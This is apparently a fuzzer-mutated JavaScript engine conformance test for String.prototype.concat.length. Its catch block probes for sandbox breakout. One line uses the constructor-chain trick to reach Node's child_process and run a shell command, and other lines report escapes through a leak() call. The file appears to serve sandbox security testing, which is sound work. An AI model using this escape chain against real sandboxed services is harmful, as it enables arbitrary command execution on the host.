try {
    if (!String.prototype.concat.hasOwnProperty('length')) {
        $ERROR('#1: String.prototype.concat.hasOwnProperty(\'length\') return true. Actual: ' + String.prototype.concat.hasOwnProperty('length'));
    }
    var __obj = String.prototype.concat.length;
    verifyNotWritable(String.prototype.concat, 'length', null, function () {
        throw () => {
            return () => {
            };
        };
        return 'shifted';
    });
    if (String.prototype.concat.length !== __obj) {
        $ERROR('#2: __obj = String.prototype.concat.length; String.prototype.concat.length = function(){return "shifted";}; String.prototype.concat.length === __obj. Actual: ' + String.prototype.concat.length);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}